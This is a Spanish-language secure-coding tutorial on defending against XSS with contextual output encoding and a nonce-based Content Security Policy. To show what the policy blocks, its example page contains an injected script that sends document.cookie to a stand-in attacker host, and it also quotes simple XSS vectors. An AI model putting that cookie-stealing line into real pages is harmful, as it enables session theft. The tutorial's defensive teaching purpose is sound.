# Objetivo 3: Defensa en Profundidad (Encoding y CSP)

## 1. El Principio de Defensa en Profundidad frente a XSS

El riesgo de Cross-Site Scripting (**XSS**) persiste como una de las amenazas más comunes en aplicaciones web modernas debido a la complejidad de la renderización del código y la diversidad de contextos en los que se procesan las entradas del usuario.

Una estrategia de seguridad madura no debe confiar en un único punto de control. El modelo de **Defensa en Profundidad** (*Defense in Depth*) postula la implementación de múltiples capas de control superpuestas, de modo que si una vulnerabilidad surge por una omisión en el desarrollo (Primera Capa), el mecanismo de seguridad a nivel de arquitectura (Segunda Capa) impida la ejecución exitosa del ataque.

```
┌────────────────────────────────────────────────────────────────────────┐
│                        PETICIÓN / DATOS DE USUARIO                     │
└───────────────────────────────────┬────────────────────────────────────┘
                                    │
                                    ▼
┌────────────────────────────────────────────────────────────────────────┐
│  CAPA 1: CODIFICACIÓN DE SALIDA CONTEXTUAL (Output Encoding)           │
│  Lógica de Código / Backend / Motor de Plantillas                      │
│  Neutraliza la interpretación sintáctica convirtiendo datos a texto.   │
└───────────────────────────────────┬────────────────────────────────────┘
                                    │
                                    ▼  (En caso de omisión o fallo)
┌────────────────────────────────────────────────────────────────────────┐
│  CAPA 2: CONTENT SECURITY POLICY (CSP)                                 │
│  Cabecera HTTP enviada por el Servidor                                 │
│  Restringe los recursos y la ejecución de scripts no autorizados.      │
└────────────────────────────────────────────────────────────────────────┘

```

---

## 2. Capa 1: Codificación de Salida Contextual (Output Encoding)

### Concepto Fundamental

La **Codificación de Salida** (*Output Encoding*) consiste en transformar datos no confiables antes de insertarlos en el documento HTML, convirtiendo cualquier carácter delimitador de sintaxis (como `<`, `>`, `"`, `'`, `&`) en su representación equivalente segura de solo lectura para el parser del navegador.

Es fundamental distinguir entre **Sanitización** y **Codificación**:

* **Sanitización:** Remueve o limpia elementos peligrosos de un contenido HTML enriquecido (ej. con *DOMPurify*).
* **Codificación:** Mantiene los datos intactos pero cambia la representación de los caracteres para que el navegador los interprete estrictamente como **datos** y nunca como **código**.

### Sensibilidad al Contexto (Context-Aware Encoding)

El parser de un navegador web interpreta la información de manera distinta según el lugar exacto del DOM donde se ubica el dato. Por ello, una codificación genérica de entidades HTML no es suficiente si el dato se renderiza dentro de un atributo, un script o un estilo.

```
 ┌──────────────────────────────────────────────────────────────────┐
 │                      CONTEXTOS DE RENDEREIZACIÓN                 │
 ├──────────────────────────────────────────────────────────────────┤
 │  1. Cuerpo HTML:       <div> $DATO </div>                        │
 │  2. Atributo HTML:     <input value="$DATO">                     │
 │  3. Contexto JS:       <script> var name = "$DATO"; </script>    │
 │  4. Contexto URL:      <a href="/profile?user=$DATO">            │
 │  5. Contexto CSS:      <style> body { color: $DATO; } </style>   │
 └──────────────────────────────────────────────────────────────────┘

```

#### 1. Contexto Cuerpo HTML (*HTML Body Context*)
* **Ubicación:** Entre etiquetas estándar (ej. `<div>$ENTRADA</div>` o `<p>$ENTRADA</p>`).
* **Regla:** Convertir caracteres especiales a Entidades HTML estándar.

| Carácter | Entidad HTML Codificada |
| :---: | :---: |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |

#### 2. Contexto Atributos HTML (*HTML Attribute Context*)
* **Ubicación:** Dentro de valores de atributos (ej. `<input type="text" name="user" value="$ENTRADA">`).
* **Regla:** Codificar todos los caracteres que no sean alfanuméricos en formato de entidad hexadecimal ASCII (`&#xHH;`), para prevenir el cierre del atributo o la inyección de manejadores de eventos (`onerror`, `onload`).

#### 3. Contexto JavaScript (*Script Context*)
* **Ubicación:** Dentro de bloques `<script>` o variables inline (ej. `let username = "$ENTRADA";`).
* **Regla:** Codificar en formato Unicode (`\uXXXX`). No utilizar entidades HTML, ya que el motor de JavaScript no decodifica entidades HTML dentro de su intérprete.

| Carácter | Codificación Unicode en JS |
| :---: | :---: |
| `<` | `\u003C` |
| `>` | `\u003E` |
| `"` | `\u0022` |
| `'` | `\u0027` |
| `\` | `\u005C` |

#### 4. Contexto URL (*URL Context*)
* **Ubicación:** Parámetros de consulta en enlaces o redirecciones (ej. `<a href="/search?q=$ENTRADA">`).
* **Regla:** Aplicar Codificación de Porcentaje (*Percent-Encoding* / `encodeURIComponent`).

---

## 3. Capa 2: Content Security Policy (CSP)

### Concepto Fundamental

**Content Security Policy (CSP)** es una cabecera HTTP de respuesta que permite a los administradores del sitio web declarar una lista blanca de orígenes y recursos permitidos para ser cargados y ejecutados en la página.

Si por una omisión en el desarrollo (fallo en la Capa 1) un atacante logra inyectar un vector XSS como `<script>alert(1)</script>` o `<img src=x onerror=...> `, **una política CSP estricta instruye al navegador para que bloquee de forma nativa la ejecución del script inyectado.**

### Estructura de la Cabecera HTTP

La cabecera se transmite desde el servidor backend:

```http
Content-Security-Policy: <directiva-1> <fuente-1> <fuente-2>; <directiva-2> <fuente-1>;
```

### Directivas Clave para la Mitigación de XSS

1. **`default-src`:** Define la política por defecto para directivas no especificadas.
2. **`script-src`:** Especifica las fuentes válidas para archivos JavaScript. Es la directiva crítica para detener XSS.
3. **`object-src`:** Controla la carga de complementos (como Plugins Flash, Java u objetos Java). Se recomienda fijar en `'none'`.
4. **`base-uri`:** Restringe los orígenes permitidos en la etiqueta `<base>`, previniendo inyecciones de redirección de rutas relativas.

### El Peligro de `'unsafe-inline'` y `'unsafe-eval'`

Por defecto, para garantizar la máxima protección contra XSS, la política CSP debe deshabilitar:

* **Scripts Inline (`'unsafe-inline'`):** Bloquea cualquier bloque `<script>...</script>` directo en el HTML y manejadores de eventos inline (`onclick="..."`, `onerror="..."`).
* **Evaluación Dinámica de Código (`'unsafe-eval'`):** Bloquea funciones peligrosas como `eval()`, `setTimeout(string)` o `setInterval(string)`.

---

## 4. Implementación Práctica: CSP Estricto Basado en Nonce

Para permitir el uso de scripts legítimos sin recurrir a la peligrosa directiva `'unsafe-inline'`, la arquitectura moderna utiliza políticas basadas en **Nonce Criptográfico** (*Cryptographic Nonce*) o **Hashes**.

### Flujo de Trabajo con Nonce Criptográfico

1. Por cada petición HTTP entrante, el servidor genera un token aleatorio e impredecible (Nonce): $N \in \{0, 1\}^{128}$.
2. El servidor incluye este Nonce en la cabecera `Content-Security-Policy`.
3. El servidor añade el mismo atributo `nonce="$N"` únicamente a los scripts inline legítimos generados por la aplicación.

```http
HTTP/1.1 200 OK
Content-Type: text/html
Content-Security-Policy: default-src 'self'; script-src 'nonce-r4nd0mN0nc3V4lu3' 'strict-dynamic'; object-src 'none'; base-uri 'none';
```

### Documento HTML Servido

```html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Aplicación Segura</title>
    
    <!-- Script legítimo permitido mediante Nonce válido -->
    <script nonce="r4nd0mN0nc3V4lu3">
        console.log("Script legítimo cargado correctamente.");
    </script>
</head>
<body>
    <h1>Perfil de Usuario</h1>

    <!-- Si un atacante inyectó el siguiente payload por falta de Output Encoding: -->
    <script>
        fetch('https://attacker.com/steal?cookie=' + document.cookie);
    </script>
</body>
</html>
```

### Resultado de la Ejecución en el Navegador

1. El **script legítimo** posee `nonce="r4nd0mN0nc3V4lu3"`, el cual coincide exactamente con el valor declarado en la cabecera CSP. El navegador lo **ejecuta**.
2. El **script inyectado** carece del atributo `nonce` (o contiene un valor adivinado/inválido). El navegador **bloquea la ejecución**, registra un error en la consola y envía un reporte de violación al servidor si la directiva `report-uri` o `report-to` está configurada.

---

## 5. Matriz de Cobertura y Sinergia de Capas

| Escenario de Amenaza | Capa 1: Output Encoding | Capa 2: Content Security Policy | Sinergia Resultante |
| :--- | :---: | :---: | :--- |
| **Inyección de etiquetas `<script>`** | **Neutralizado** (Se renderiza como texto `&lt;script&gt;`) | **Neutralizado** (Bloqueado por falta de Nonce/Hash) | **Protección Redundante:** El ataque no se muestra ni se ejecuta. |
| **Inyección de atributos `onerror` en `<img>`** | **Neutralizado** (Se codifican comillas y caracteres especiales) | **Neutralizado** (El CSP prohíbe scripts inline y eventos) | **Protección Redundante:** El manejador de eventos es neutralizado. |
| **Omitir codificación en una nueva vista de backend** | *Falla la Capa 1* (Vulnerabilidad presente) | **Neutralizado** (El CSP bloquea la ejecución del script) | **Rescates de Seguridad:** El CSP actúa como red de seguridad impidiendo la explotación. |
| **Uso de librerías de terceros desactualizadas** | *Inaplicable* (El fallo está en la librería cliente) | **Neutralizado** (El CSP limita adónde se pueden enviar los datos extraídos) | **Mitigación del Impacto:** Se evita la exfiltración de datos. |

---

## 6. Conclusión

Ninguna medida aislada es 100% infalible en sistemas web complejos. La **Codificación de Salida Contextual** elimina la causa raíz del XSS al garantizar que las entradas del usuario nunca alteren la estructura gramatical del documento. 

Por su parte, **Content Security Policy (CSP)** proporciona un límite de contención robusto que restringe las capacidades del navegador en caso de que una vulnerabilidad logre esquivar la primera línea de defensa. La combinación sinérgica de ambas capas garantiza una arquitectura resiliente y libre de riesgos por ejecución remota de scripts.